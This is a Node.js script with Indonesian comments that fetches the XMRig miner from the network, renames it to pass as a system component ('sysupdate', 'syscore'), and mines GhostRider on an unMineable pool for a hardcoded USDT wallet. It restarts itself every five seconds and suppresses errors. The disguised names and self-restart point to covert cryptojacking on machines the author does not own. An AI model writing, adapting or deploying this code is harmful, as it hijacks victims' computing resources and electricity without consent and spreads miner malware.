const { spawn, exec } = require('child_process');
const fs = require('fs');
const https = require('https');

// === CONFIG ===
// USDT payout memakai alamat TRON/TRC20.
const ADDR = 'ghostrider.unmineable.com:3333';
const AUTH_KEY = 'USDT:TJm8qGE5gmMVcfwFTmWBqwrjSkDFnhs81x#c5kh-a9zb';
const PASS = 'x';
const MODE = 'ghostrider';

const XMRIG_VERSION = '6.26.0';
const REMOTE_URL = `https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz`;
const ASSET_FILE = 'sysupdate-usdt.tar.gz';
const EXTRACTED_DIR = `xmrig-${XMRIG_VERSION}`;
const TARGET_DIR = 'syscore-usdt';

function startProcess() {
    console.log('Memulai core engine USDT TRON dengan mode TLS...');

    const worker = spawn(`./${TARGET_DIR}/syscore`, [
        '-a', MODE,
        '-o', ADDR,
        '-u', AUTH_KEY,
        '-p', PASS,
        '--randomx-wrmsr=-1',
        '--randomx-no-rdmsr',
        '-k'
    ]);

    worker.stdout.on('data', (data) => {
        process.stdout.write(data.toString());
    });

    worker.stderr.on('data', (data) => {
        process.stderr.write(data.toString());
    });

    worker.on('close', (code) => {
        console.log(`[!] Proses terhenti dengan kode: ${code}`);
        console.log('Mencoba restart kembali dalam 5 detik...');
        setTimeout(startProcess, 5000);
    });
}

function fetchAsset(url, dest, cb) {
    https.get(url, (res) => {
        if (res.statusCode === 301 || res.statusCode === 302) {
            return fetchAsset(res.headers.location, dest, cb);
        }

        const file = fs.createWriteStream(dest);
        res.pipe(file);

        file.on('finish', () => {
            file.close(cb);
        });
    }).on('error', (err) => {
        fs.unlink(dest, () => {});
        if (cb) cb(err.message);
    });
}

function initialize() {
    if (fs.existsSync(TARGET_DIR)) {
        console.log('[+] Core engine USDT sudah terpasang. Menjalankan...');
        startProcess();
    } else {
        console.log('[+] Mendownload paket komponen via HTTPS...');

        fetchAsset(REMOTE_URL, ASSET_FILE, (err) => {
            if (err) {
                console.error(`[X] Gagal mendownload: ${err}`);
                return;
            }

            console.log('[+] Download selesai. Mengekstrak komponen...');

            exec(`tar -xf ${ASSET_FILE} && mv ${EXTRACTED_DIR} ${TARGET_DIR} && mv ./${TARGET_DIR}/xmrig ./${TARGET_DIR}/syscore`, (error) => {
                if (error) {
                    console.error(`[X] Gagal ekstrak paket: ${error.message}`);
                    return;
                }
                console.log('[+] Ekstrak dan konfigurasi folder berhasil.');

                if (fs.existsSync(ASSET_FILE)) {
                    fs.unlinkSync(ASSET_FILE);
                }

                startProcess();
            });
        });
    }
}

initialize();

process.on('uncaughtException', function (err) {
    console.error('[X] Terjadi kesalahan sistem: ', err);
});
